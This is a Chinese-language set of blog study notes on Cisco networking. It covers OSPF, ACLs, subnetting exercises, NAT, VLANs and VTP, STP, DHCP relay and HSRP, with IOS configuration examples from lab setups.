IA（域间路由）表示从其他区域学到的路由。 O 34.1.1.0 [110/2] via 23.1.1.2, 00:01:28, FastEthernet0/1 44.0.0.0/32 is subnetted, 1 subnets O 44.1.1.1 [110/3] via 23.1.1.2, 00:01:28, FastEthernet0/1 45.0.0.0/24 is subnetted, 1 subnets O IA 45.1.1.0 [110/3] via 23.1.1.2, 00:01:28, FastEthernet0/1 55.0.0.0/32 is subnetted, 1 subnets O IA 55.1.1.1 [110/4] via 23.1.1.2, 00:01:28, FastEthernet0/1 10.OSPF中的网络类型： point to Point：点到点，代表接口是Serial口 Broadcast Multi Access：广播型多路访问，代表接口是g0/0,f0/0,e0/0 11.在MA网络中，为了避免过多的邻接关系和重复的路由信息传递，要在MA网络中选举DR和BDR。 （1）DR和BDR的选举依据：DR和BDR是基于接口的概念。一个路由器的不同接口可能属于不同的角色。 先比较优先级；优先级范围是0～255，数值越大，优先级越高，默认为1 比较Router-id（手工指定；回还口最大；物理接口Ip地址最大；） 说明：如果接口的优先级为0，就表示这个接口不参与DR/BDR的选举；==》DRother。 （2）关系： DR和BDR之间：邻接关系====》Full（邻接关系表示交互LSA，可以交互路由条目==》交作业） DR/BDR与DRother之间：邻接关系====》Full DRother之间：邻居关系====》2-way状态（只交互hello，不交互路由信息） （3）DR和BDR一旦选举完成，不具备“抢占性”====》为了保证网络的稳定性。 如果DR Down掉，由BDR接替DR的工作； 继续在DRother中选举一个BDR； 如果原始的DR即便恢复正常，也只能当DRother； （4）选举期：在MA网络中，选举时间是40s；在选举期内正常根据选举依据进行选举； 一旦选举完成，就不能再更改====》非选举期内，不再选举。 （5）调整接口优先级： R8(config)#int f0/0 R8(config-if)#ip ospf priority 100 （6）DRother监听组播地址224.0.0.5 DR、BDR监听2个组播地址224.0.0.5和224.0.0.6； 当DRother想把路由信息传递给DR/BDR时，目标地址是224.0.0.6（上交） 当DR、BDR通告路由信息的时候，目标地址是224.0.0.5（下发） （7）清除ospf进程的命令： clear ip ospf process ===&gt;输入yes；]]></content>
      <tags>
        <tag>网络基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络七]]></title>
    <url>%2F2019%2F09%2F09%2F%E7%BD%91%E7%BB%9C%E4%B8%83%2F</url>
    <content type="text"><![CDATA[ACL和子网划分1.配置思路 第一步：配置PC 第二步：配置二层交换机，划分vlan 第三步：三层交换机配置SVI（交互虚接口），下联链路是2层，上联链路是3层； 实现不同vlan通信： 路由器====》单臂路由 三层交换机===》交换虚接口 第四步：三层交换机开启路由器功能，解决路由问题 第五步：出口路由器配置IP和路由 2.ACL（Access Control List）访问控制列表：可以基于3层、4层的数据做过滤。 ACL的工作原理（匹配规则）： 按照从上到下依次匹配； 如果有一条一旦匹配完成，就不再进行后续报文的匹配； 隐含的一条是拒绝所有； ACL中最少要有一条允许的条目，否则没有意义； 3.ACL的分类：标准ACL和扩展ACL （1）标准访问控制列表 基于源IP地址过滤数据包 标准访问控制列表的访问控制列表号是1～99 （2）扩展访问控制列表 基于源IP地址、目的IP地址、指定协议、端口和标志来过滤数据包 扩展访问控制列表的访问控制列表号是100～199 4.标准ACL的配置： （1）基本格式： Router(config)#access-list 编号 { permit允许| deny拒绝 } source 通配符掩码 通配符掩码：是用来对Ip地址进行匹配的，用0表示精确匹配（必须匹配），用“1”表示模糊匹配（可以不匹配） access-list 1 permit 192.168.1.0 0.0.0.255 ====&gt;匹配流量：192.168.1.0/24 access-list 1 permit 192.168.2.2 0.0.0.0 ====&gt;匹配流量是一个主机：192.168.2.2 access-list 1 permit host 192.168.2.2 =====&gt;匹配一个主机的流量 access-list 1 deny 0.0.0.0 255.255.255.255 ====&gt;access-list 1 deny any 拒绝所有流量 access-list 10 permit 192.168.1.1 0.0.0.0 //允许192.168.1.1主机地址（1） access-list 10 deny 192.168.1.0 0.0.0.255 //拒绝192.168.1.0/24这个网段（2） access-list 10 permit 172.16.0.0 0.0.255.255 //允许172.16.0.0/16这个网段（3） access-list 10 deny host 192.168.2.3 //拒绝主机192.168.2.3（4） access-list 10 permit 10.0.0.0 0.0.0.255 //允许10.0.0.0/24这个网段（5） access-list 10 deny 192.168.0.0 0.0.255.255 //拒绝192.168.0.0/16这个网段（6） 192.168.1.1/24====》允许===》1 192.168.2.3/24====》拒绝===》4 192.168.2.2/24====》拒绝===》6 192.168.10.10/24===》拒绝===》6 192.168.30.20/24===》拒绝===》6 200.1.1.1/24=======》拒绝===》隐含的一条拒绝所有 101.1.1.1/24=======》拒绝===》隐含的一条拒绝所有 10.5.5.5/24========》拒绝===》隐含的一条拒绝所有 10.3.3.3/16========》拒绝===》隐含的一条拒绝所有 10.6.6.6/8=========》拒绝===》隐含的一条拒绝所有 10.0.0.1/24========》允许===》5 34.1.1.1/24========》拒绝===》隐含的一条拒绝所有 （2）ACL的配置步骤：ACL的书写规则就是让范围小的条目尽量靠前。 第一步：定义ACL 第二步：应用到接口——————尽量应用到入接口。 特别说明：ACL只有应用到接口，才会生效。 int f0/1 ip access-group 编号 in/out 第三步；检查ACL的匹配情况 Router#show access-lists //match表示匹配了该条目 Standard IP access list 10 10 permit host 192.168.1.1 (4 match(es))​​====================================子网划分===============================1.IP基础： 网络位：在Ip地址中，与子网掩码“1”对应的位是网络位。 主机位：在IP地址中，与子网掩码“0”对应的位是主机位。 网络地址：在IP地址中，如果主机位全为0表示网络地址。 广播地址：在IP地址中，如果主机位全为1,表示广播地址。 A、B、C类的划分————————有类地址 A:1——126，子网：255.0.0.0 B：128——191，子网：255.255.0.0 C：192——223，子网：255.255.255.0 12.1.1.0/24————无类地址 私网地址： A类：10.0.0.010.255.255.255 10.0.0.0/8 B类：172.16.0.0172.31.255.255 172.16.0.0/16————172.31.0.0/16 C类：192.168.0.0~192.168.255.255 192.168.0.0/24————192.168.255.0/24 2.常见的二进制转十进制 10000000= 11000000= 11100000= 11110000= 11111000= 11111100= 11111110= 11111111= 2的1次方= 2的2次方= 2的3次方= 2的4次方= 2的5次方= 2的6次方= 2的7次方= 2的8次方= 2的9次方= 2的10次方= 3.IP地址是由32位的二进制数组成，地址空间是42亿多，且在2012年已经分配完毕（在IANA）。 如何来解决IP地址不够用的问题？——VLSM（变长子网掩码） （1）计算可容纳的主机数 ：2的m次方-2（m代表的是子网掩码中“0”的个数） A类：10.0.0.0/8 （255.0.0.0） 2的24次方-2 B类：172.16.1.0/16 （255.255.0.0） 2的16次方-2 C类：200.1.1.0/24 （255.255.255.0） 2的8次方-2 （2）计算可以划分的网段数：2的n次方（n代表网络位向主机位借的”1”的个数） C类：192.168.1.0/24 (3)求变化范围：256-X（X表示子网掩码中非255的数） 3.应用场景：一个公司有4个部门（市场部、后勤部、财务部、销售部），每个部门有35台主机， 要使用192.168.1.0/24来做地址划分，不同的部门之间不能通信， 给出每个部门的IP范围和子网、各个部门的网络地址和广播地址。 192.168.1 .0 第一步：求n 255.255.255.0 ======&gt; 255.255.255.11 000000 2的n次方&gt;=4 ======&gt; n&gt;=2 第二步：求新的子网掩码 新的子网掩码：255.255.255.192 第三步：求变化范围 256-X=256-192=64 写出新的网段 网络地址 广播地址 市场部：192.168.1.0————192.168.1.63/255.255.255.192 后勤部：192.168.1.64————192.168.1.127 财务部：192.168.1.128————192.168.1.191 销售部：192.168.1.192————192.168.1.255 如果用C类：192.168.1.0/24 192.168.2.0/24 192.168.3.0/24 192.168.4.0/24 (254-35=219 * 4 ) 4.举例：某运营商拿到一个地址段为128.16.0.0/16，给全国每个省进行划分，已知全国有34个省， 请给出每个省市分配的网络地址，广播地址，子网掩码。 第一步：求n 2的n次方&gt;=34 ====&gt; n&gt;=6 原来子网：255.255.0.0 第二步：新的子网掩码 新的子网：255.255.111111 00.00000000 ===》255.255.252.0 第三步：求范围 256-X=256-252=4 网络地址 广播地址 128.16.0.0————128.16.3.255 128.16.4.0————128.16.7.255 128.16.8.0————128.16.11.255 …… 128.16.248.0————128.16.251.255 128.16.252.0————128.16.255.255 练习：1.把100.0.0.0/8划分50个网段，写出新的子网掩码、写出网络地址，广播地址。 2的n次方&gt;=50 n&gt;=6 求新的子网：255.111111 00.0.0 ====》255.252.0.0 求范围：256-X=256-252=4 100.0.0.0————100.3.255.255 100.4.0.0————100.7.255.255 100.8.0.0————100.11.255.255 …… 100.248.0.0————100.251.255.255 100.252.0.0————100.255.255.255 2.11.0.0.0/16划分100个网段 2的n次方&gt;=100 n&gt;=7 新的子网：255.255.1111111 0.0====》255.255.254.0 求范围：256-254=2 11.0.0.0/23——————11.0.1.255 11.0.2.0/23——————11.0.3.255 11.0.4.0/23——————11.0.5.255 …… 11.0.252.0/23——————11.0.253.255 11.0.254.0/23——————11.0.255.255 3.把200.0.0.0/24划分10个网段，求新的子网掩码、写出网络地址、广播地址。 2的n次方&gt;=10 n&gt;=4 新的子网：255.255.255.1111 0000 ====》 255.255.255.240 求范围：256-240=16 200.0.0.0————200.0.0.15 200.0.0.16————200.0.0.31 200.0.0.32————200.0.0.47 …… 200.0.0.224————200.0.0.239 200.0.0.240————200.0.0.255 找出以下IP地址的网络地址和广播地址（1）111.243.77.191/11 方式1：（第一段的111是十进制） 111.243.77.191 ====》111.111 10011‬.77.191 ====&gt;111.111 00000.0.0(111.224.0.0网络地址) ====&gt;111.111 11111.11111111.11111111 （广播地址：111.255.255.255） 255.224.0.0 ====》255.111 00000.0.0 方式2： 已知的子网：255.111 00000.0.0 ===》255.224.0.0 求范围：256-224=32 找到变化的位是第二段，让这个数值，除以求出来的范围：243/32=7……19 ====》因为网络地址肯定是变化范围的整数倍，舍去余数。 32*7=224 111.224.0.0——————111.255.255.255​（2）151.17.183.251/21 （3）222.16.35.247/20 （4）200.66.55.11/21 写出网络地址和广播地址 ACL和NAT1.子网划分： 使用200.1.1.0/24在一条链路上，只使用2个IP，最佳的方案是怎么做？ 2的m次方-2 &gt;=2 =====&gt; m&gt;=2（子网中0的个数） 255.255.255.111111 00 ====&gt; 255.255.255.252 （1）以太网链路上的二层封装：EthernetII和802.3 在以太链路上，子网掩码最多是30位。 （2）在公网上的二层封装是PPP（支持认证，标准协议），很多家庭用户接入使用的都是PPPOE拨号上网，只有用户名和密码都匹配完成才能上网。 如果在Serial串口链路上，子网最多可以是31位。 在串行链路上，分为DCE和DTE DCE是data communicate equipment的意思，即数据通信设备,是ISP端，负责给客户端分配带宽。 DTE是data terminal equipment的意思，即数据终端设备，是客户端。 ISP端，需要给客户端分配带宽 int s0/2/0 encapsulation ppp //设置接口封装格式为PPP ip add 200.1.1.2 255.255.255.252 //配置接口IP clock rate 2000000 //给客户端指定带宽是2M no sh 客户端： interface Serial0/3/0 ip address 200.1.1.1 255.255.255.252 encapsulation ppp no sh （3）如果是回还口做测试，子网掩码最多是32位。 1.扩展ACL：可以基于源目Ip、源目端口、协议来对数据流量做过滤。 举例1；定义一个ACL，编号为101，拒绝192.168.1.0/24 到达 192.168.2.2 的FTP服务 Router(config)# access-list 101 deny tcp 192.168.1.0 0.0.0.255 host 192.168.2.2 eq 21 举例2：定义ACL101，拒绝192.168.1.0/24访问192.168.2.2的ICMP服务 access-list 101 deny icmp 192.168.1.0 0.0.0.255 host 192.168.2.2 举例3：允许或拒绝所有流量 access-list 101 permit ip any any //第一个any是源，第二个any是目标2.实验举例： R2(config)#access-list 100 permit tcp host 192.168.1.1 host 192.168.2.3 eq 80 R2(config)#access-list 100 deny ip host 192.168.1.1 host 192.168.2.3 R2(config)#access-list 100 permit icmp host 192.168.1.1 host 192.168.2.1 R2(config)#access-list 100 deny icmp host 192.168.1.1 host 192.168.2.2 R2(config)#access-list 100 permit tcp host 192.168.1.2 host 12.1.1.2 eq telnet interface Serial0/2/0 ip address 12.1.1.2 255.255.255.252 //配置IP encapsulation ppp //设置封装格式 ip access-group 100 in //应用到接口 clock rate 4000000 //设置时钟频率，给客户端分配的带宽 检查命令：show access-lists ​​ 如果删除某条ACL，就要使用命名ACL的规则：​ R2(config)#ip access-list extended 100 //extended表示修改扩展ACL，编号为100​ R2(config-ext-nacl)#no 80 //删除ACL条目编号为80 ​​ 补充特殊的ACL：FTP的被动模式​ access-list 100 permit tcp host 192.168.1.2 host 192.168.2.3 eq ftp //放行192.168.1.2到192.168.2.3的TCP-21，FTP控制连接​ access-list 100 permit tcp host 192.168.1.2 host 192.168.2.3 range 1024 65535 //放行数据连接，目标端口号为大于1024的范围​​ 远程登录配置：​ R2(config)#line vty 0 4​ R2(config)#password 123456​ R2(config)#login​ R2(config)#enable password 123456 3.常见服务和端口的对应关系 UDP服务：DHCP（udp-67,68）、DNS（udp-53）、NTP（udp-123，用于linux中的时间同步） TFTP（udp-69） TCP服务： FTP(tcp-21和20) http（tcp-80）；https（tcp-443） 远程桌面RDP（tcp-3389） Telnet（tcp-23） MySQL（tcp-3306） ssh（tcp-22） SMTP（tcp-25） POP3（tcp-110） 共享（tcp-445） 1.NAT(Network Address Translation)：网络地址转换，用来把私网地址转换为公网地址。 NAT的作用：实现地址转换；实现内外网隔离；节约了IP地址；把IPV4转换为IPv6. 2.NAT的工作原理： 3.NAT的配置步骤； 第一步：先定义内外网接口。 R1(config)#int f0/0 R1(config-if)#ip nat inside R1(config-if)#int f0/1 R1(config-if)#ip nat outside 第二步：定义上网的网段 R1(config)#access-list 10 permit 192.168.1.0 0.0.0.255 第三步：把私网地址转换为公网地址 R1(config)#ip nat inside source list 10 interface f0/1 overload 检查命令： R1#show ip nat translations 协议 公网地址 私网地址 公网的目标地址 Pro Inside global Inside local Outside local Outside global icmp 12.1.1.1:33 192.168.1.1:33 34.1.1.2:33 34.1.1.2:33Destination host unreachable //目标主机不可达，一般是路由问题； NAT详解1.NAT的用途分为： 源SNAT：当内网访问外网的时候，经过路由器，会把源地址中的私网地址转换为公有地址，SNAT。 目的：实现上网。 目的DNAT：当外网访问内网服务器的时候，经过（服务器端的）路由器的时候，会把目标公网地址转换为服务器的真实私网IP，DNAT。 目的：服务器发布，可以通过公网来访问，对外开放一些常用端口（web-tcp80;dns-udp53）。 发布服务器的两种方案： 方案一：直接重新申请一个公网IP给服务器使用。===》静态NAT 方法二：在路由器的公网口的Ip上，开放某个端口，作为服务器的端口映射。===》端口映射 2.按照NAT的实现方式； （1）静态NAT：一对一，一个私网ip对应一个公网ip。 应用；当某一个服务器需要对外发布的时候。 （2）动态NAT：多对多，多个私网Ip对应多个公网ip。 应用；服务器集群使用。 （3）PAT（端口多路复用）：多对一，多个私网IP对应一个公网ip。 应用：常见的家庭网、企业网、园区网等用的比较多。 3.PAT配置举例： R1(config)#int f0/1 R1(config-if)#ip nat outside R1(config-if)#int f0/0 R1(config-if)#ip nat inside R1(config-if)#exit R1(config)#access-list 10 permit host 192.168.1.1 R1(config)#access-list 10 permit host 192.168.1.2 R1(config)#ip nat inside source list 10 interface f0/1 overload 4.静态NAT：一对一 ；始终存在。 R1(config)#int f0/1 R1(config-if)#ip nat outside R1(config-if)#int f0/0 R1(config-if)#ip nat inside R1(config-if)#exit R1(config)#ip nat inside source static 192.168.1.3 12.1.1.10 5.动态NAT：多对多 第一步：声明内网网接口 R1(config)#int f0/1 R1(config-if)#ip nat outside R1(config-if)#int f0/0 R1(config-if)#ip nat inside R1(config-if)#exit 第二步：定义需要做动态转换的服务器私网Ip R4(config)#access-list 20 permit host 192.168.2.3 R4(config)#access-list 20 permit host 192.168.2.4 R4(config)#access-list 20 permit host 192.168.2.5 R4(config)#access-list 20 permit host 192.168.2.6 第三步：定义一个公网地址池，名字叫Server，开启IP是34.1.1.10，结束ip是34.1.1.13，子网掩码是255.255.255.0 R4(config)#ip nat pool Server 34.1.1.10 34.1.1.13 netmask 255.255.255.0 第四步：把定义的NAT转换到公网地址池Server中 R4(config)#ip nat inside source list 20 pool Server 6.目的NAT的实现方式；让外网的客户端能访问内网服务器。 方案一：直接重新申请一个公网IP给服务器使用。===》静态NAT 方法二：在路由器的公网口的Ip上，开放某个端口，作为服务器的端口映射。===》端口映射 配置端口映射：内网IP是192.168.1.3的TCP-80（web服务）到公网接口的12.1.1.1:80 R1(config)#ip nat inside source static tcp 192.168.1.3 80 12.1.1.1 80 配置端口映射：内网ip是192.168.1.3的DNS服务器（udp-53），映射后的公网 ip12.1.1.1:53 R1(config)#ip nat inside source static udp 192.168.1.3 53 12.1.1.1 53 ​​​]]></content>
      <tags>
        <tag>网络基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络六]]></title>
    <url>%2F2019%2F09%2F09%2F%E7%BD%91%E7%BB%9C%E5%85%AD%2F</url>
    <content type="text"><![CDATA[单臂路由1.以太通道和vlan划分的排查命令： SW3#show vlan brief //检查vlan和接口是否对应（access链路） SW3#show int trunk //检查trunk链路 SW3#show etherchannel summary //检查以太通道（SU表示正常；如果是其他状态，就进入接口先shutdown ，再no shutdown） （1）以太通道的协商方式： 使用的两个协议： Link Aggregation Control Protocol ， LACP ：IEEE 定义的标准协议。 Port Aggregation Protocol：是Cisco的专有协议。 SW2(config)#int range f0/6 - 8 SW2(config-if-range)#channel-group 1 mode ? active Enable LACP unconditionally //主动模式 passive Enable LACP only if a LACP device is detected //被动模式 auto Enable PAgP only if a PAgP device is detected //被动模式，自动协商 desirable Enable PAgP unconditionally //期望，主动模式 on Enable Etherchannel only //表示手工指定为on；对端必须是on才能协商成功。 1.单臂路由：实现不同vlan的通信。 (1)基本配置： int f0/0 no shut int f0/0.10 //创建一个子接口 encapsulation dot1q 10 //设置数据帧的封装格式为dot1q，对应的vlanID是10 ip add 192.168.10.254 255.255.255.0 (2)工作原理： 源目IP地址不变，二层mac地址被重写，实现标签置换。 2.实验步骤：先实现内网通信；再实现外网通信。 （1）第一步：先配置PC和网关 （2）第二步：配置二层交换机————划分vlan，配置trunk Switch(config-if)#int f0/2 Switch(config-if)#sw mode acc Switch(config-if)#sw acc vlan 20 Switch(config-if)#int f0/3 Switch(config-if)#switchport access vlan 30 Switch(config-if)#int f0/4 Switch(config-if)#switchport mode trunk （3）第三步：在出口路由器的内接口，配置单臂路由，实现内网不同vlan的通信 interface FastEthernet0/0 no shutdown interface FastEthernet0/0.10 encapsulation dot1Q 10 ip address 192.168.10.254 255.255.255.0 （4）第四步：内网通了以后，实现外网通信。 检查IP的命令： R2(config-if)#do show ip int bri R2(config-if)#do show ip route //检查路由表 1.VTP（Vlan Trunking Protocol）：vlan中继协议，用来管理vlan的创建、删除和修改。 VTP的前提条件：交换机之间必须是Trunk链路；必须都在相同的域名中。 2.VTP的三种模式： （1）服务器模式（Server） 可以创建、删除和修改VLAN 学习、转发相同域名的VTP通告 （2）客户机模式（Client） 学习、转发相同域名的VTP通告 不可以创建、删除和修改VLAN （3）透明模式（Transparent） 可以创建、删除和修改VLAN，但只在本地有效 转发但不学习VTP通告3.VTP的基本配置； vtp domain test //配置vtp的域名 vtp mode server/client/transparent //服务端、客户端、透明模式 vtp version 2 //指定VTP的版本号 vtp password 123456 //加入域中的密码 show vtp status //检查vtp的状态 说明： （1）为了防止其他设备先同步vlan信息，尽量先配VTP，再起trunk。 （2）服务端和客户端的vlan信息存放在flash:/vlan.dat中； 即使清掉域信息，flash里还是有vlan信息，所以只能删掉数据库文件，重启才能真正清除信息。 Server#delete flash:/vlan.dat //清空配置时，要先删除vlan.dat Server#erase startup-config //清除配置 Server#reload //重启 （3）透明模式的VTP配置会出现在show run里 三层交换机和DHCP1.交换机的工作原理是广播————&gt;划分广播域：vlan划分——————&gt;access和trunk————&gt;不同vlan之间的通信——————&gt;单臂路由 单臂路由：源目IP地址不变，mac地址被重写；实现标签置换。 trunk链路的工作原理：发送的时候会给数据帧打上相应vlan的标签（802.1q数据帧）；接收的时候根据标签里的vlanID来识别来自哪个vlan。 在出交换机的时候，去掉标签，还原成原始数据帧。 2.单臂路由带来的问题： “单臂”为网络骨干链路，容易形成网络瓶颈 子接口依然依托于物理接口，应用不灵活 VLAN间转发需要查看路由表，严重浪费设备资源3.常见的数据包交换方式： （1）包交换：每个数据包在经过路由器的时候，都要查找路由表（通过CPU）。 （2）三层交换技术； 基于数据流来进行路由表的查找； 查找完了以后，会在本地的ASIC芯片上做缓存，后续报文不再需要查路由表，直接查找缓存信息。 五元组：源目IP、源目端口、协议。如果多个数据包的五元组一样，我们把他们都称为同一个“数据流” 七元组：源IP地址、目的IP地址、协议号、源端口、目的端口，服务类型以及接口索引 （3）CEF转发：基于拓扑的模型 FIB:转发信息表，路由表的download（复制了一份） 邻接关系表：ARP表。​4.三层交换机的工作原理：一次路由，多次交换。 基本配置： （1）支持开启路由功能：ip routing （2）把二层接口转换为3层接口，直接配置IP​ int f0/1​ no switchport //关闭二层功能，转换为三层接口​ ip address 192.168.10.254 255.255.255.0​ no sh （3）支持SVI（Switch Virtual Interface）交换虚接口​ int vlan 10​ ip add 192.168.10.254 255.255.255.0​ no sh​5.实验说明： （1）配置PC （2）配置二层交换机：划分vlan和trunk （3）配置三层交换机：​ 第一步：把内网接口配置为trunk链路，并设置封格式为dot1q​ interface FastEthernet0/1​ switchport trunk encapsulation dot1q​ switchport mode trunk​ 第二步：在交换虚接口里配置PC的网关​ 3L-1(config)#vlan 10​ 3L-1(config)#int vlan 10​ 3L-1(config-if)#ip add 192.168.10.254 255.255.255.0​ 3L-1(config-if)#no sh​​ 第三步：配置外网接口​ 3L-1(config)#int f0/2​ 3L-1(config-if)#no switchport​ 3L-1(config-if)#ip add 12.1.1.1 255.255.255.0​ 3L-1(config-if)#no sh​​ 第四步：开启路由功能​ ip routing 1.DHCP(Dynamic Host Configuration Protocol)动态主机配置协议，用来给客户端分配IP、子网、网关、DNS等。 DHCP使用的是UDP 67,68端口。 作用域：给客户端分配的网段。192.168.1.0/24 地址池：给客户端分配IP的范围。192.168.1.1——192.168.1.50 保留地址：让某一个客户端总是获取相同的Ip。 排除地址：不给客户端分配的IP 2.DHCP的配置： R1(config)#do show run | s dhcp ip dhcp excluded-address 192.168.10.254 //排除网关IP ip dhcp excluded-address 192.168.10.1 192.168.10.9 //排除一个范围 ip dhcp pool vlan10 //启用地址池，名字叫vlan10 network 192.168.10.0 255.255.255.0 //配置作用域为192.168.10.0/24 default-router 192.168.10.254 //给客户端使用的默认网关 //给客户端使用的DNS 3.DHCP的4种常见报文：客户端找服务器的时候是2个广播报文；服务器回复的时候是2个单播报文。 （1）Discover：发现报文，用来寻找网络中的DHCP服务器。 Source : 0.0.0.0 PC的mac地址为源 Destination: 255.255.255.255 全FFFF （2）Offer：提供报文，是DHCP从自己的地址池中选择一个IP地址，分配给客户端。 （3）Request：请求报文，告诉网络中的其他DHCP服务器“不用再给我分配IP了”；防止IP地址冲突。 （4）Ack：确认报文，确认客户端的Ip地址等信息，确认租约时间。 4.当DHCP和客户端不在同一个网段的时候，需要配置DHCP中继代理。 PC找DHCP的时候，是通过广播报文，应该在网关接口配置DHCP中继代理。 int vlan 10 ip add 192.168.10.254 255.255.255.0 ip helper-address 192.168.50.1 //告诉网关，谁是DHCP服务器 STP1.DHCP的中继代理配置步骤：先解决内网的通信问题。 （1）在三层交换机的下行接口上划分vlan （2）在三层交换机的上行接口上启用三层接口，并配置Ip （3）在三层交换机上给PC配置网关 vlan 10 vlan 20 int vlan 10 ip address 192.168.10.254 255.255.255.0 no sh ip helper-address 192.168.50.1 //配置DHCP中继代理，告诉客户端，谁是DHCP服务器 ip routing ip route 0.0.0.0 0.0.0.0 192.168.50.1 （4）在出口路由器配置 第一步：配置接口IP 第二步：配置DHCP地址池 第三步：配置到达内网vlan的路由 1.STP的作用和版本 （1）作用：二层的防环机制 （2）版本： STP：生成树协议，只有1棵树——————&gt;PVST（每vlan每生成树，Cisco私有协议） RSTP：快速生成树协议，只有1棵树——————&gt;Rapid PVST（快速每vlan每生成树，Cisco的私有协议） MST：多实例生成树，可以基于实例（组）对根桥进行选举。 2.STP的三步选举：比较小的。 （1）第一步：选举根桥（Root Bridge：皇帝） （2）第二步：选举根端口（Root port：知府） （3）第三步：选举指定端口（Designated Port：钦差） 3.第一步选举：在所有的交换机中选举一个根桥 选举依据：网桥ID=2Byte（优先级）+6Byte（mac地址） 一般会通过优先级来控制根桥的选举。 4.第二步选举：在每个非根桥上选举一个根端口（Root Port） 选择根端口的依据： 到根网桥最低的根路径成本（开销，到达根桥最近） 直连的网桥ID最小(发送者) 端口ID最小（发送者） 5.第三步选举：在每条链路上选举一个指定端口（DP） 根桥上的所有接口都是指定端口。 非根桥上的指定端口，选择顺序： 端口所在交换机到达根路径成本较低 本端交换机网桥ID较小 本端的端口ID的值较小 6.STP的其他知识 （1）STP通过BPDU（桥协议数据单元）来交互报文信息。 BPDU分为两大类：一类是“配置BPDU”用来完成STP的选举；另一种是拓扑变更TCP的BPDU，当拓扑发生改变的时候交互信息。 （2）STP中的几种状态： Disabled：禁用状态 Blocking：阻塞状态，不能收发用户数据，只能接收BPDU（时刻监听网络的状态） Listening：用来选举 Learning：用于学习mac地址 Forwarding：收发用户数据 （3）STP中的状态切换时间 Listening——————&gt;learning——————&gt;Forwarding 经过了30s：PC接入网络的时间 Blocking————&gt;Listening——————&gt;learning——————&gt;Forwarding 经过50s 7.STP的相关命令 show spanning-tree //查看生成树的收敛结果 3L-1# show spanning-tree vlan 10 //查看STP的接口状态命令 spanning-tree vlan 10 root primary //让本交换机成为vlan10的主根桥 spanning-tree vlan 20 root secondary //让本交换机成为vlan20的备份根桥 spanning-tree vlan 10 priority 4096 //调整交换机在vlan10里的优先级为4096，值必须是4096的倍数 spanning-tree vlan 10,20,30 priority 24576 //如果一个交换机设置为root primary会自动降低8192； spanning-tree vlan 40,50,60 priority 28672 //如果一个交换机设置为root secondary会降低4096 Switch(config)#int f0/1 //默认情况下，PC接入网络中需要等待30s的延迟（STP的收敛），为了加快时间的收敛，启用portfast。 Switch(config-if)#spanning-tree portfast //启用portfast以后，接口不再等待30s的STP报文交互，直接进入到Forwarding状态 8.基础命令 （1）配置vlan命令 interface FastEthernet0/3 //把接口加入到vlan30 switchport access vlan 30 switchport mode access ! interface FastEthernet0/4 //把接口设置为trunk switchport mode trunk​​ show vlan brief //检查接口和vlan是否对应​ show int trunk //检查trunk链路是否正常 （2）三层交换机上下联接口使用trunk​ interface range FastEthernet0/1 - 3​ switchport trunk encapsulation dot1q​ switchport mode trunk 3L-1(config)#spanning-tree vlan 10,20,30 root primary //交换机做vlan10/20/30的主根桥 3L-1(config)#spanning-tree vlan 40,50,60 root secondary //交换机做vlan40/50/60备份根桥​​ 3L-2(config)#spanning-tree vlan 40,50,60 root primary​ 3L-2(config)#spanning-tree vlan 10,20,30 root secondary ​ （3）三层交换机上配置PC的网关​ 3L-2(config-if)#exit​ 3L-2(config)#int vlan 50​ 3L-2(config-if)#ip add 192.168.50.254 255.255.255.0​ 3L-2(config-if)#no sh 3L-2(config)#ip routing （4）配置回还口： interface Loopback0 ip address 11.1.1.1 255.255.255.0 特别说明：做实验的时候，先把内网做通！！！ 三层交换机上要有默认路由到出口路由器；出口路由器要有到达内网的路由 HSRP1.HSRP（Hot Standby Routing Protocol）：热备份路由协议，解决的是网关的冗余问题。 HSRP是Cisco的私有协议，公有协议是VRRP。 2.HSRP中的路由器角色 （1）Active：主路由器，第一个功能是负责转发客户端的流量；第二个功能是定期向外发送hello包。 （2）Standby：备份路由器，如果主路由器发生故障，要接替主路由器的工作，负责转发用户的数据。 作用：监听主路由器的状态；定期向外发送hello。 （3）Virtual Router 虚拟路由器:真实路由器逻辑上模拟出来的路由器，使用IP作为客户端的网关。 （4）其他路由器:当备份顶替主路由器时，顶替备份路由器来工作 3.HSRP中的角色选举依据；先比优先级大的，优先级相同再比ip地址大的） （1）优先级可以人工干预设置，默认优先级是100，取值范围是0-255 （2）优先级相同，比较IP 4.HSRP的工作原理： （1）所有路由器中选举一个Active，负责转发用户流量；并向外发送hello （2）当活跃路由器故障后，备份路由器监听不到活跃路由器的hello消息后会成为活跃路由器，承担活跃路由器转发到虚拟路由器的数据包； （3）然后其他路由器收不到备份路由器的hello消息，他们会从其他路由器中选举出一个新的备份路由器。 5.HSRP的mac地址说明： 0000.0c07.ac2f 其中0000.0c表示厂商信息，07.ac是众所周期的mac；2f表示HSRP的组号 6.HSRP的基本配置： 主路由器的配置； interface FastEthernet0/0 ip address 192.168.1.100 255.255.255.0 //物理接口的IP standby version 2 //HSRP的版本号，默认是版本2；默认不需要配置 standby 1 ip 192.168.1.254 //配置虚拟的网关Ip standby 1 priority 105 //调整接口的优先级为105，默认优先级为100. standby 1 preempt //开启抢占，主发生故障再恢复以后，把状态抢回来。 standby 1 track FastEthernet0/0 //设置接口追踪 standby 1 track FastEthernet0/1 备份路由器的配置： interface FastEthernet0/0 ip address 192.168.1.200 255.255.255.0 standby version 2 standby 1 ip 192.168.1.254 standby 1 track FastEthernet0/1 standby 1 track FastEthernet0/0 检查命令： R2#show standby brief //查看HSRP的简要信息 Interface Grp Pri P State Active Standby Virtual IP Fa0/0 1 90 Standby 192.168.1.100 local 192.168.1.254 本地启用HSRP的接口；Group表示组；State 表示本地的状态；Active表示活跃路由器的IP；Virtual Ip是虚拟的客户端的网关 R2#show standby FastEthernet0/0 - Group 1 (version 2) //启用HSRP的接口是f0/0，组号为1，版本号为2 State is Standby //本地的状态为Standby 9 state changes, last state change 00:49:15 Virtual IP address is 192.168.1.254 //虚拟的网关Ip Active virtual MAC address is 0000.0C9F.F001 //虚拟的网关mac Local virtual MAC address is 0000.0C9F.F001 (v2 default) Hello time 3 sec, hold time 10 sec //hello时间 Next hello sent in 2.011 secs Preemption disabled //抢占是关闭 Active router is 192.168.1.100, priority 90 (expires in 6 sec) //活跃路由器的IP是192.168.1.100，优先级为90 MAC address is 0000.0C9F.F001 //活跃路由器的mac地址 Standby router is local //本地是standby Priority 90 (default 100) //本地的优先级为90，默认是100 Track interface FastEthernet0/1 state Up 